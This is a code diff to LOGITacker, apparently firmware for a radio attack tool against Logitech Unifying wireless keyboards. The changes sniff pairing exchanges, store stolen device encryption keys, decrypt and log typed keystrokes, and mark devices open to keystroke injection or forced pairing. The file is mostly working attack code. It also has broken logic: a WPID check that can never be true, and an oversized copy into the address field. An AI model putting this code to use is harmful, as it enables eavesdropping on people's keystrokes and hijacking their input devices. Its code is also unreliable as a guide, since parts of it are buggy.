@@ -20,7 +20,7 @@ NRF_LOG_MODULE_REGISTER();
 
 APP_TIMER_DEF(m_timer_next_tx_action);
 
-static uint8_t m_test_device_key[] = { 0x08, 0x38, 0xE2, 0xF2, 0xBC, 0x6B, 0x1A, 0x72, 0xFF, 0x88, 0xEC, 0x4D, 0x07, 0x6D, 0x40, 0x5E };
+//static uint8_t m_test_device_key[] = { 0x08, 0x38, 0xE2, 0xF2, 0xBC, 0x6B, 0x1A, 0x72, 0xFF, 0x88, 0xEC, 0x4D, 0x07, 0x6D, 0x40, 0x5E };
 
 typedef enum {
     LOGITACKER_SUBEVENT_TIMER,
@@ -77,7 +77,7 @@ typedef struct {
     uint8_t known_prefix;
     uint8_t current_channel_index;
 
-    logitacker_device_t devices[NRF_ESB_PIPE_COUNT];
+    logitacker_device_set_t devices[NRF_ESB_PIPE_COUNT];
 } logitacker_substate_passive_enumeration_t;
 
 
@@ -87,6 +87,8 @@ typedef struct {
     logitacker_substate_discovery_t substate_discovery;
     logitacker_substate_passive_enumeration_t substate_passive_enumeration;
     logitacker_substate_active_enumeration_t substate_active_enumeration;
+
+    logitacker_pairing_sniff_on_success_t pairing_sniff_on_success_action; //not only state, persistent config
 
     bsp_event_callback_t current_bsp_event_handler;
     nrf_esb_event_handler_t current_esb_event_handler;
@@ -144,12 +146,6 @@ void pairing_sniff_disable_pipe1();
 void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event);
 void pairing_sniff_event_handler_timer_next_action(void *p_context);
 
-
-/*
-void logitacker_enter_mode_pairing_sniff();
-void logitacker_enter_mode_active_enum(uint8_t * rf_address);
-void logitacker_discovery_mode_set_on_new_address_action(logitacker_discovery_on_new_address_t on_new_address_action);
-*/
 
 /* main/master event handler */
 void main_event_handler_timer_next_action(void *p_context) {
@@ -311,26 +307,7 @@ void discovery_process_rx() {
            
             NRF_LOG_HEXDUMP_DEBUG(p_rx_payload->data, p_rx_payload->length);
 
-            // retrieve device entry if existent
-            /*
-            logitacker_device_t *p_device = logitacker_device_list_get_by_addr(addr);
-            if (p_device == NULL) {
-                // device doesn't exist, add to list
-                logitacker_device_t new_device = {0};
-                memcpy(new_device.base_addr, base, 4);
-                logitacker_device_add_prefix(&new_device, prefix); // append prefix to the new device
-                p_device = logitacker_device_list_add(new_device); // add device to device list
-                if (p_device != NULL) {
-                    NRF_LOG_INFO("DISCOVERY: added new device entry for %s", addr_str_buff);
-                } else {
-                    NRF_LOG_WARNING("DISCOVERY: failed to add new device entry for %s! device list full ?", addr_str_buff);
-                }
-            } else {
-                // existing device
-                NRF_LOG_INFO("DISCOVERY: device %s already known", addr_str_buff);
-            }
-            */
-           logitacker_device_t *p_device = logitacker_device_list_add_addr(addr);
+            logitacker_device_set_t *p_device = logitacker_device_set_add_new_by_dev_addr(addr);
 
             // update device counters
             if (p_device != NULL) {
@@ -415,7 +392,7 @@ void passive_enum_process_rx() {
             bool unifying_is_keep_alive;
             unifying_frame_classify(rx_payload, &unifying_report_type, &unifying_is_keep_alive);
 
-//            logitacker_device_t *p_device = &m_state_local.substate_passive_enumeration.devices[rx_payload.pipe]; //pointer to correct device meta data
+//            logitacker_device_set_t *p_device = &m_state_local.substate_passive_enumeration.devices[rx_payload.pipe]; //pointer to correct device meta data
 
             uint8_t addr[5];
             nrf_esb_convert_pipe_to_address(p_rx_payload->pipe, addr);
@@ -437,14 +414,21 @@ void passive_enum_process_rx() {
                 NRF_LOG_HEXDUMP_INFO(p_rx_payload->data, p_rx_payload->length);
 
                 if (unifying_report_type == UNIFYING_RF_REPORT_ENCRYPTED_KEYBOARD) {
-                    if (logitacker_unifying_crypto_decrypt_encrypted_keyboard_frame(m_keyboard_report_decryption_buffer, m_test_device_key, p_rx_payload) == NRF_SUCCESS) {
-                        NRF_LOG_INFO("Test decryption of keyboard payload:");
-                        NRF_LOG_HEXDUMP_INFO(m_keyboard_report_decryption_buffer, 8);
-                        for (int k=1; k<7; k++) {
-                            if (m_keyboard_report_decryption_buffer[k] == 0x00 && k>0) break; //print no further keys
-                            NRF_LOG_INFO("Key %d: %s", k, keycode_to_str(m_keyboard_report_decryption_buffer[k]));
-                        }
+                    // check if theres a device entry for the address
+                    logitacker_device_capabilities_t * p_caps = logitacker_device_get_caps_pointer(addr);
+                    if (p_caps != NULL && p_caps->key_known) {
+                        // decrypt and print frame
+                        if (logitacker_unifying_crypto_decrypt_encrypted_keyboard_frame(m_keyboard_report_decryption_buffer, p_caps->key, p_rx_payload) == NRF_SUCCESS) {
+                            NRF_LOG_INFO("Test decryption of keyboard payload:");
+                            NRF_LOG_HEXDUMP_INFO(m_keyboard_report_decryption_buffer, 8);
+                            //ToDo: print modifier
 
+                            // print human readable form of keys
+                            for (int k=1; k<7; k++) {
+                                if (m_keyboard_report_decryption_buffer[k] == 0x00 && k>0) break; //print no further keys
+                                NRF_LOG_INFO("Key %d: %s", k, keycode_to_str(m_keyboard_report_decryption_buffer[k]));
+                            }
+                        }
                     }
                 }
             }
@@ -549,7 +533,7 @@ void active_enum_update_tx_payload(uint8_t iteration_count) {
 
 // increments pipe 1 address prefix (neighbour discovery)
 bool active_enum_advance_to_next_addr_prefix(logitacker_substate_active_enumeration_t *p_state) {
-    // all possible prefixes (neighbours) tested?
+    // all possible device_prefixes (neighbours) tested?
     if (p_state->next_prefix == p_state->known_prefix) {
         p_state->phase = LOGITACKER_ACTIVE_ENUM_PHASE_FINISHED;
         NRF_LOG_INFO("Tested all possible neighbours");
@@ -575,7 +559,7 @@ bool active_enum_advance_to_next_addr_prefix(logitacker_substate_active_enumerat
 
 void active_enum_add_device_address_to_list() {
     logitacker_substate_active_enumeration_t * p_state = &m_state_local.substate_active_enumeration;
-    if (logitacker_device_list_add_addr(p_state->current_rf_address) != NULL) {
+    if (logitacker_device_set_add_new_by_dev_addr(p_state->current_rf_address) != NULL) {
         NRF_LOG_INFO("device address %s added/updated", addr_str_buff);
     } else {
         NRF_LOG_INFO("failed to add/update device address %s", addr_str_buff);
@@ -653,18 +637,21 @@ void active_enum_process_sub_event(logitacker_subevent_t se_type, void *p_subeve
                         //device supports plain injection
                         NRF_LOG_INFO("ATTACK VECTOR: devices accepts plain keystroke injection (LED test succeeded)");
                         logitacker_device_capabilities_t *p_caps = logitacker_device_get_caps_pointer(p_state->current_rf_address);
-                        if (p_caps != NULL) p_caps->is_plain_keyboard = true;
+                        if (p_caps != NULL) p_caps->vuln_plain_injection = true;
                     } else if (rf_report_type == UNIFYING_RF_REPORT_PAIRING && device_id == PAIRING_REQ_MARKER_BYTE) { //data[0] holds byte used in request
                         //device supports plain injection
                         NRF_LOG_INFO("ATTACK VECTOR: forced pairing seems possible");
                         logitacker_device_capabilities_t *p_caps = logitacker_device_get_caps_pointer(p_state->current_rf_address);
                         if (p_caps != NULL) {
-                            p_caps->forced_pairing_allowed = true;
+                            p_caps->vuln_forced_pairing = true;
+                        }
+                        logitacker_device_set_t * p_device_set = logitacker_device_set_list_get_by_addr(p_state->current_rf_address);
+                        if (p_device_set != NULL) {
                             // dongle wpid is in response (byte 8,9)
-                            p_caps->dongle_WPID = (tmp_payload.data[9] << 8) | tmp_payload.data[10];
-                            if (p_caps->dongle_WPID == 0x8802) p_caps->dongle_is_nordic = true;
-                            if (p_caps->dongle_WPID == 0x8808) p_caps->dongle_is_texas_instruments = true;
-                            NRF_LOG_INFO("Dongle WPID is %.4X (TI: %s, Nordic: %s)", p_caps->dongle_WPID, p_caps->dongle_is_texas_instruments ? "yes" : "no", p_caps->dongle_is_nordic ? "yes" : "no");
+                            memcpy(p_device_set->wpid, &tmp_payload.data[9], 2);
+                            if (p_caps->wpid[0] == 0x88 && p_caps->wpid[0] == 0x02) p_device_set->is_nordic = true;
+                            if (p_caps->wpid[0] == 0x88 && p_caps->wpid[0] == 0x08) p_device_set->is_texas_instruments = true;
+                            NRF_LOG_INFO("Dongle WPID is %.2X%.2X (TI: %s, Nordic: %s)", p_device_set->wpid[0], p_device_set->wpid[1], p_device_set->is_texas_instruments ? "yes" : "no", p_device_set->is_nordic ? "yes" : "no");
                         }
 
                     }
@@ -757,6 +744,33 @@ void pairing_sniff_disable_pipe1() {
     app_timer_start(m_timer_next_tx_action, m_pair_sniff_ticks, NULL); // restart timer
 }
 
+void pairing_sniff_on_success() {
+    switch (m_state_local.pairing_sniff_on_success_action) {
+        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_CONTINUE:
+            NRF_LOG_INFO("Continue to sniff pairing");
+            return;
+        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_DISCOVERY:
+            NRF_LOG_INFO("Sniffed full pairing, changing back to discover mode");
+            app_timer_stop(m_timer_next_tx_action);
+            logitacker_enter_mode_discovery();
+            break;
+        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_ACTIVE_ENUMERATION:
+            app_timer_stop(m_timer_next_tx_action);
+            helper_addr_to_hex_str(addr_str_buff, 5, m_device_pair_info.device_rf_address);
+            NRF_LOG_INFO("Sniffed full pairing, moving on with active enumeration for %s", nrf_log_push(addr_str_buff));
+            logitacker_enter_mode_active_enum(m_device_pair_info.device_rf_address);
+            break;
+        case LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION:
+            app_timer_stop(m_timer_next_tx_action);
+            helper_addr_to_hex_str(addr_str_buff, 5, m_device_pair_info.device_rf_address);
+            NRF_LOG_INFO("Sniffed full pairing, moving on with passive enumeration for %s", nrf_log_push(addr_str_buff));
+            logitacker_enter_mode_passive_enum(m_device_pair_info.device_rf_address);
+            break;
+        default:
+            break;
+    }
+}
+
 void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event) {
     uint32_t freq;
     nrf_esb_get_rf_frequency(&freq);
@@ -796,6 +810,26 @@ void pairing_sniff_event_handler_esb(nrf_esb_evt_t *p_event) {
                 if (logitacker_pairing_parser(&m_device_pair_info, &tmp_payload) == NRF_SUCCESS) {
                     // full pairing parsed (no frames missing)
                     pairing_sniff_disable_pipe1();
+
+                    //retrieve device or add new and update data
+                    logitacker_device_set_t * p_device_set = logitacker_device_set_add_new_by_dev_addr(m_device_pair_info.device_rf_address);
+                    if (p_device_set == NULL) {
+                        NRF_LOG_ERROR("failed adding device entry for pairing sniff result");
+                    } else {
+                        // update device caps
+                        logitacker_device_capabilities_t * p_caps = logitacker_device_get_caps_pointer(m_device_pair_info.device_rf_address);
+                        memcpy(p_caps->serial, m_device_pair_info.device_serial, 4);
+                        memcpy(p_caps->device_name, m_device_pair_info.device_name, m_device_pair_info.device_name_len);
+                        memcpy(p_caps->key, m_device_pair_info.device_key, 16);
+                        memcpy(p_caps->raw_key_data, m_device_pair_info.device_raw_key_material, 16);
+                        memcpy(p_caps->rf_address, m_device_pair_info.device_rf_address, 16);
+                        memcpy(p_caps->wpid, m_device_pair_info.device_wpid, 2);
+                        memcpy(p_device_set->wpid, m_device_pair_info.dongle_wpid, 2);
+
+                        p_caps->key_known = m_device_pair_info.key_material_complete;
+                    }
+
+                    pairing_sniff_on_success();
                 }
             }
             pairing_sniff_reset_timer();
@@ -866,15 +900,15 @@ void logitacker_enter_mode_passive_enum(uint8_t *rf_address) {
     memcpy(m_state_local.substate_passive_enumeration.base_addr, base_addr, 4);
     m_state_local.substate_passive_enumeration.known_prefix = prefix;
     
-    // define listening prefixes for neighbours and dongle address (0x00 prefix)
+    // define listening device_prefixes for neighbours and dongle address (0x00 prefix)
     uint8_t prefixes[] = { 0x00, prefix, prefix-1, prefix-2, prefix+1, prefix+2, prefix+3 };
     int prefix_count = sizeof(prefixes);
 
-    // if the rf_address is in device list and has more than 1 prefix (f.e. from active scan), overwrite listen prefixes
-    logitacker_device_t * p_dev = logitacker_device_list_get_by_addr(rf_address);
-    if (p_dev->num_prefixes > 1) {
-        memcpy(prefixes, p_dev->prefixes, p_dev->num_prefixes);
-        prefix_count = p_dev->num_prefixes;
+    // if the rf_address is in device list and has more than 1 prefix (f.e. from active scan), overwrite listen device_prefixes
+    logitacker_device_set_t * p_dev = logitacker_device_set_list_get_by_addr(rf_address);
+    if (p_dev->num_device_prefixes > 1) {
+        memcpy(prefixes, p_dev->device_prefixes, p_dev->num_device_prefixes);
+        prefix_count = p_dev->num_device_prefixes;
     }
 
 
@@ -934,7 +968,7 @@ void logitacker_enter_mode_pairing_sniff() {
     m_state_local.current_radio_event_handler = NULL;
     m_state_local.current_esb_event_handler = pairing_sniff_event_handler_esb;
     m_state_local.current_timer_event_handler = pairing_sniff_event_handler_timer_next_action;
-
+    m_state_local.pairing_sniff_on_success_action = LOGITACKER_PAIRING_SNIFF_ON_SUCCESS_SWITCH_PASSIVE_ENUMERATION;
 
     
     bsp_board_leds_off(); //disable all LEDs
